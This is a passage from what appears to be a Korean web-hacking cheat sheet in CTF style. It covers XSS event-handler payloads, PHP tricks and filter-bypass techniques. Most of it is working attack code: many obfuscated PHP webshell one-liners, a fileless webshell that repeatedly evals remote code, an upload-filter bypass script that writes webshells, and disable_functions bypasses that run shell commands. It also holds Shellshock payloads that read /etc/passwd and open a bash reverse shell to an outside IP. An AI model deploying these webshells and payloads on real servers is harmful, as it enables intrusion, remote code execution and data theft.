class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"-ms-scroll-limit:1px;overflow:scroll;width:1px"</span> <span class="attr">onscroll</span>=<span class="string">"alert(1)"</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>MSIE10</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">contenteditable</span> <span class="attr">onresize</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>MSIE11</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onactivate</span>=<span class="string">"alert(1)"</span> <span class="attr">id</span>=<span class="string">"xss"</span> <span class="attr">style</span>=<span class="string">"overflow:scroll"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onfocus</span>=<span class="string">"alert(1)"</span> <span class="attr">id</span>=<span class="string">"xss"</span> <span class="attr">style</span>=<span class="string">"display:table"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"xss"</span> <span class="attr">style</span>=<span class="string">"-ms-block-progression:bt"</span> <span class="attr">onfocus</span>=<span class="string">"alert(1)"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"xss"</span> <span class="attr">style</span>=<span class="string">"-ms-layout-flow:vertical-ideographic"</span> <span class="attr">onfocus</span>=<span class="string">"alert(1)"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"xss"</span> <span class="attr">style</span>=<span class="string">"float:left"</span> <span class="attr">onfocus</span>=<span class="string">"alert(1)"</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>Chrome, Opera, Safari</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="keyword">@keyframes</span> x&#123;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"animation-name:x"</span> <span class="attr">onanimationstart</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>Chrome, Opera, Safari</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css"><span class="selector-tag">div</span> &#123;<span class="attribute">width</span>: <span class="number">100px</span>;&#125;</span></span><br><span class="line"><span class="css"><span class="selector-tag">div</span><span class="selector-pseudo">:target</span> &#123;<span class="attribute">width</span>: <span class="number">200px</span>;&#125;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"xss"</span> <span class="attr">onwebkittransitionend</span>=<span class="string">"alert(1)"</span> <span class="attr">style</span>=<span class="string">"-webkit-transition: width .1s;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>Safari</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"overflow:-webkit-marquee"</span> <span class="attr">onscroll</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="client-side-request-forgery"><a href="#client-side-request-forgery" class="headerlink" title="client side request forgery"></a>client side request forgery</h2><ul><li>xhr 또는 fetch 를 사용하여, 다른 페이지 데이터 가져올 수 있음</li><li>a tag ping attribute</li><li>30? : redirect with post data preserve<ul><li>연구 필요</li></ul></li><li>XS-Leaks<ul><li>[설명추가예정 : 방법 다양함]</li></ul></li></ul><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><ul><li><p>webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system($_GET[<span class="string">"cmd"</span>]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> system($_GET[<span class="number">1</span>]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">"`$_GET[1]`"</span>); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>= system($_GET[cmd]);</span><br><span class="line"><span class="meta">&lt;?</span>=`$_GET[<span class="number">1</span>]`;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[cmd]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `$_GET[<span class="number">1</span>]`;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> passthru($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> shell_exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(str_rot13(<span class="string">'riny($_CBFG[cntr]);'</span>));<span class="meta">?&gt;</span></span><br><span class="line">&lt;script language=<span class="string">"php"</span>&gt;system(<span class="string">"id"</span>); &lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> $_GET[<span class="string">'a'</span>]($_GET[<span class="string">'b'</span>]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// a=system&amp;b=ls</span></span><br><span class="line"><span class="comment">// a=assert&amp;b=system("ls")</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> array_map(<span class="string">"ass\x65rt"</span>,(<span class="keyword">array</span>)$_REQUEST[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// .php?cmd=system("ls")</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>@extract($_REQUEST);@<span class="keyword">die</span>($f($c));<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// .php?f=system&amp;c=id</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">include</span>($_FILES[<span class="string">'u'</span>][<span class="string">'tmp_name'</span>]);  </span><br><span class="line"><span class="comment">// 構造 &lt;form action="http://x.x.x.x/shell.php" method="POST" enctype="multipart/form-data"&gt;上傳</span></span><br><span class="line"><span class="comment">// 把暫存檔include進來</span></span><br><span class="line"><span class="comment">// From: http://www.zeroplace.cn/article.asp?id=906</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> $x=~¾¬¬º­«;$x($_GET[<span class="string">'a'</span>]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// not backdoor (assert)</span></span><br><span class="line"><span class="comment">// .php?a=system("ls")</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&#123;$&#123;phpinfo()&#125;&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$&#123;system(ls)&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> Y2F0IGZsYWc= | base64 -d | sh</span><br><span class="line"><span class="comment">// Y2F0IGZsYWc=   =&gt;  cat  flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> -e <span class="string">"&lt;?php passthru(\$_POST[1])?&gt;;\r&lt;?php echo 'A PHP Test ';"</span> &gt; shell.php</span><br><span class="line"><span class="comment">// cat shell.php</span></span><br><span class="line"><span class="comment">// <span class="meta">&lt;?php</span> echo 'A PHP Test ';" <span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> ^<span class="meta">&lt;?php</span> <span class="keyword">eval</span>^($_POST[<span class="string">'a'</span>]^); ?^&gt; &gt; a.php</span><br><span class="line"><span class="comment">// Windows echo導出一句話</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> fwrite(fopen(<span class="string">"gggg.php"</span>,<span class="string">"w"</span>),<span class="string">"&lt;?php system(\$_GET['a']);"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'HTTP/1.1 404'</span>);</span><br><span class="line">ob_start();</span><br><span class="line">phpinfo();</span><br><span class="line">ob_end_clean();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// 無回顯後門  </span></span><br><span class="line"><span class="comment">// e.g. ?pass=file_get_contents('http://15.165.0.114/test')</span></span><br><span class="line">ob_start(<span class="string">'assert'</span>);</span><br><span class="line"><span class="keyword">echo</span> $_REQUEST[<span class="string">'pass'</span>];</span><br><span class="line">ob_end_flush();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=</span><br><span class="line"><span class="comment">// 沒有英數字的webshell</span></span><br><span class="line">$💩 = <span class="string">'[[[[@@'</span> ^ <span class="string">'("(/%-'</span>;</span><br><span class="line">$💩((<span class="string">'@@['</span>^<span class="string">'#!/'</span>).<span class="string">" /????"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">A=fl;B=ag;cat $A$B</span><br></pre></td></tr></table></figure></li><li><p>disable function history</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; isitdtu</span><br><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pczntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,escapeshellarg,escapeshellcmd,passthru,proc_close,proc_get_status,proc_open,shell_exec,mail,imap_open,</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 2015 orange</span><br><span class="line">exec, passthru, shell_exec, system, proc_open, popen, curl_exec,</span><br><span class="line">curl_multi_exec, parse_ini_file, symlink, chgrp, chmod, chown, dl, mail,</span><br><span class="line">imap_mail, apache_child_terminate, posix_kill, proc_terminate,</span><br><span class="line">proc_get_status, syslog, openlog, ini_alter, ini_set, ini_restore,</span><br><span class="line">putenv, apache_setenv, pcntl_alarm, pcntl_fork, pcntl_waitpid,</span><br><span class="line">pcntl_wait,  pcntl_wtermsig, pcntl_wstopsig, pcntl_signal,</span><br><span class="line">pcntl_signal_dispatch, pcntl_sigtimedwait, pcntl_sigprocmask,</span><br><span class="line">pcntl_sigwaitinfo, pcntl_exec, pcntl_setpriority, link, readlink</span><br></pre></td></tr></table></figure></li><li><p>xor(^) 연산이나 not(~) 연산, and(&amp;) 연산 이용하여 필터 바이패스</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> (%f3%f9%f3%f4%e5%ed &amp; %<span class="number">7</span>f%<span class="number">7</span>f%<span class="number">7</span>f%<span class="number">7</span>f%<span class="number">7</span>f%<span class="number">7</span>f); <span class="comment">// system</span></span><br><span class="line">[~] 과 [^] 예제 추가 예정</span><br></pre></td></tr></table></figure></li><li><p>이중 참조</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="string">'apple'</span>; $b=<span class="string">'a'</span>;</span><br><span class="line"><span class="keyword">echo</span> $$b; <span class="comment">//apple</span></span><br></pre></td></tr></table></figure></li><li><p>배열 첨자</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$arr = <span class="keyword">array</span>(<span class="string">'a'</span> =&gt; <span class="string">'b'</span>);</span><br><span class="line">var_dump($arr[<span class="string">'a'</span>]); <span class="comment">// "b"</span></span><br><span class="line">var_dump($arr&#123;<span class="string">'a'</span>&#125;); <span class="comment">// "b"</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>file_put_contents</p></li><li><p>lfi with null bytes (php 5.?.? 버전까지)</p></li><li><p>rfi</p><ul><li>allow_url_include</li><li>allow_url_fopen</li><li>UNC</li></ul></li><li><p>파일 없는 php webshell</p><ul><li>연구 방향성 불일치, 연구 불필요하다고 생각됨</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    unlink(<span class="keyword">__FILE__</span>);  </span><br><span class="line">    ignore_user_abort(<span class="keyword">true</span>);  </span><br><span class="line">    set_time_limit(<span class="number">0</span>);  </span><br><span class="line">    $remote_file = <span class="string">'http://xxx/xxx.txt'</span>;  </span><br><span class="line">    <span class="keyword">while</span>($code = file_get_contents($remote_file))&#123;  </span><br><span class="line">        @<span class="keyword">eval</span>($code);  </span><br><span class="line">        sleep(<span class="number">5</span>);  </span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure></li><li><p>wrapper</p><ul><li>php://filter wrapper<ul><li>php://filter/read=string.rot13/</li><li>php://filter/convert.iconv.utf-8.utf-16/</li><li>php://filter/convert.base64-encode/</li><li>php://filter/convert.base64-decode/</li><li>php://filter/zlib.deflate/</li><li>php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=</li><li>convert.base64-encode 이용하여 충분히 길게 만들면 메모리 과할당으로 crash 유발할 수 있음</li></ul></li><li>zip://</li><li>data://</li><li>expect://<ul><li>아주 특수한 경우에만 발생</li></ul></li><li>php://input</li><li>phar://</li></ul></li><li><p>special files</p><ul><li><p>/proc/self/environ</p><ul><li>최신 버전에서는 읽지 못하게 권한 관리</li></ul></li><li><p>/proc/self/fd</p></li><li><p>sessions file</p><ul><li><p>session.upload_progress</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">2</span> + base64.b64encode(<span class="string">b'&lt;?=eval($_GET[cmd])?&gt;'</span>)</span><br><span class="line">payload2 = <span class="string">'&lt;?=`ls -al /`?&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    requests.post(sys.argv[<span class="number">1</span>],</span><br><span class="line">        cookies = &#123; <span class="string">'PHPSESSID'</span>: <span class="string">'posix'</span> &#125;,</span><br><span class="line">        data = &#123; <span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: payload &#125;,</span><br><span class="line">        files = &#123; payload2: <span class="string">'A'</span>*<span class="number">1000</span> &#125;</span><br><span class="line">    )</span><br></pre></td></tr></table></figure></li><li><p>/var/lib/php5/sessions/sess_posix</p></li><li><p>/var/lib/php/sessions/sess_posix</p></li><li><p>/tmp/sess_posix</p></li></ul></li><li><p>file upload tmp file</p><ul><li>/tmp/phpoSWPOI</li><li>/tmp/php[A-Za-z0-9]{5}</li></ul></li></ul></li><li><p>nginx</p><ul><li><a href="https://github.com/posixlee/phuip-fpizdam" target="_blank" rel="noopener">https://github.com/posixlee/phuip-fpizdam</a></li></ul></li><li><p>escapeshellarg + escapeshellcmd</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">$a = escapeshellarg($a);</span><br><span class="line">$a = escapeshellcmd($a);</span><br><span class="line"></span><br><span class="line">$cmd = <span class="string">'ls '</span> . $a . <span class="string">' 2&gt;&amp;1'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'cmd: '</span> . $cmd . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'out:'</span> . exec($cmd);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; https:&#x2F;&#x2F;php.rwx.kr&#x2F;?a&#x3D;%27%201%20&#x2F;tm%203%27</span><br><span class="line">cmd: ls &#39;&#39;\\&#39;&#39; 1 &#x2F;tm 3&#39;\\&#39;&#39;&#39; 2&gt;&amp;1</span><br><span class="line">out:ls: cannot access &#39;3\\&#39;: No such file or directory</span><br></pre></td></tr></table></figure></li><li><p>multibyte webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># Description : create and bypass file upload filter with .htaccess</span></span><br><span class="line"><span class="comment"># Author : Thibaud Robin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Will prove the file is a legit xbitmap file and the size is 1337x1337</span></span><br><span class="line">SIZE_HEADER = <span class="string">b"\\n\\n#define width 1337\\n#define height 1337\\n\\n"</span></span><br><span class="line"></span><br><span class="line">def generate_php_file(filename, script):</span><br><span class="line">phpfile = open(filename, <span class="string">'wb'</span>) </span><br><span class="line"></span><br><span class="line">phpfile.write(script.encode(<span class="string">'utf-16be'</span>))</span><br><span class="line">phpfile.write(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">phpfile.close()</span><br><span class="line"></span><br><span class="line">def generate_htacess():</span><br><span class="line">htaccess = open(<span class="string">'..htaccess'</span>, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">htaccess.write(SIZE_HEADER)</span><br><span class="line">htaccess.write(<span class="string">b'AddType application/x-httpd-php .php16\\n'</span>)</span><br><span class="line">htaccess.write(<span class="string">b'php_value zend.multibyte 1\\n'</span>)</span><br><span class="line">htaccess.write(<span class="string">b'php_value zend.detect_unicode 1\\n'</span>)</span><br><span class="line">htaccess.write(<span class="string">b'php_value display_errors 1\\n'</span>)</span><br><span class="line"></span><br><span class="line">htaccess.close()</span><br><span class="line"></span><br><span class="line">generate_htacess()</span><br><span class="line"></span><br><span class="line">generate_php_file(<span class="string">"webshell.php16"</span>, <span class="string">"&lt;?php system($_GET['cmd']); die(); ?&gt;"</span>)</span><br><span class="line">generate_php_file(<span class="string">"scandir.php16"</span>, <span class="string">"&lt;?php echo implode('\\n', scandir($_GET['dir'])); die(); ?&gt;"</span>)</span><br><span class="line">generate_php_file(<span class="string">"getfile.php16"</span>, <span class="string">"&lt;?php echo file_get_contents($_GET['file']); die(); ?&gt;"</span>)</span><br><span class="line">generate_php_file(<span class="string">"info.php16"</span>, <span class="string">"&lt;?php phpinfo(); die(); ?&gt;"</span>)</span><br></pre></td></tr></table></figure></li><li><p>disable function bypass</p><ul><li><p>Imagick</p><ul><li><p>command injhtection (old version)</p><ul><li><a href="https://www.exploit-db.com/exploits/39766" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/39766</a></li></ul></li><li><p>PATH + ghostscript</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    unsetenv(<span class="string">"PATH"</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmd = getenv(<span class="string">"CMD"</span>);</span><br><span class="line">    system(cmd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">putenv(<span class="string">'PATH=/tmp/mydir'</span>);</span><br><span class="line">putenv(<span class="string">'CMD=/readflag &gt; /tmp/mydir/output'</span>);</span><br><span class="line">chmod(<span class="string">'/tmp/mydir/gs'</span>,<span class="string">'0777'</span>);</span><br><span class="line">$img = <span class="keyword">new</span> Imagick(<span class="string">'/tmp/mydir/1.ept'</span>);</span><br></pre></td></tr></table></figure></li><li><p>LD_PRELOAD + ghostscript</p><ul><li><a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#solution-2:-bypass-disable_function-with-ld_preload" target="_blank" rel="noopener">https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#solution-2:-bypass-disable_function-with-ld_preload</a></li><li>eps 이외 다른 파일포멧도 되는거 여러가지 있음, Imagick 설정에 의존적</li></ul></li><li><p>ffmpeg</p><ul><li><a href="https://hxp.io/blog/53/0CTF-Quals-2019-Wallbreaker-easy-writeup/" target="_blank" rel="noopener">https://hxp.io/blog/53/0CTF-Quals-2019-Wallbreaker-easy-writeup/</a></li></ul></li><li><p>MAGICK_CODER_MODULE_PATH</p><ul><li>[<a href="https://www.imagemagick.org/script/resources.php#Environment%20Variables]" target="_blank" rel="noopener">https://www.imagemagick.org/script/resources.php#Environment%20Variables]</a>(<a href="https://www.imagemagick.org/script/resources.php#Environment" target="_blank" rel="noopener">https://www.imagemagick.org/script/resources.php#Environment</a> Variables)</li><li><a href="https://github.com/m0xiaoxi/CTF_Web_docker/tree/master/TCTF2019/Wallbreaker_Easy" target="_blank" rel="noopener">https://github.com/m0xiaoxi/CTF_Web_docker/tree/master/TCTF2019/Wallbreaker_Easy</a></li></ul></li><li><p>MAGICK_CONFIGURE_PATH</p><ul><li><a href="https://xz.aliyun.com/t/4688#toc-14" target="_blank" rel="noopener">https://xz.aliyun.com/t/4688#toc-14</a></li></ul></li></ul></li><li><p>using <code>FFI</code></p><ul><li>php 7.4 ~</li><li><a href="https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2019/nextphp" target="_blank" rel="noopener">https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2019/nextphp</a></li></ul></li><li><p>Extension</p><ul><li><a href="https://github.com/w181496/FuckFastcgi" target="_blank" rel="noopener">https://github.com/w181496/FuckFastcgi</a></li></ul></li><li><p><code>LD_PRELOAD + mail()</code></p></li><li><p><code>imap_open()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$payload &#x3D; &quot;echo hello|tee &#x2F;tmp&#x2F;executed&quot;;</span><br><span class="line">$encoded_payload &#x3D; base64_encode($payload);</span><br><span class="line">$server &#x3D; &quot;any -o ProxyCommand&#x3D;echo\t&quot;.$encoded_payload.&quot;|base64\t-d|bash&quot;;</span><br><span class="line">@imap_open(&#39;&#123;&#39;.$server.&#39;&#125;:143&#x2F;imap&#125;INBOX&#39;, &#39;&#39;, &#39;&#39;);</span><br></pre></td></tr></table></figure></li><li><p>dl()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dl(&quot;evil.so&quot;)</span><br></pre></td></tr></table></figure></li><li><p>error_log()</p><ul><li>추가예정</li></ul></li><li><p>shellshock</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">() &#123; :; &#125;; echo vulnerable</span><br><span class="line">() &#123; :a; &#125;; &#x2F;bin&#x2F;cat &#x2F;etc&#x2F;passwd</span><br><span class="line">() &#123; :; &#125;; &#x2F;bin&#x2F;bash -c &#39;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;15.165.0.114&#x2F;8888 0&gt;&amp;1&#39;</span><br></pre></td></tr></table></figure></li><li><p>JSON UAF Bypass</p><ul><li><a href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php-json-bypass</a></li></ul></li><li><p>GC Bypass</p><ul><li><a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></li></ul></li><li><p>Backtrace UAF Bypass</p><ul><li><a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a></li></ul></li><li><p>[추가 예정]</p></li></ul></li><li><p>open_basedir bypass</p><ul><li><p>glob wrapper</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$file_list = <span class="keyword">array</span>();</span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*"</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;  </span><br><span class="line">    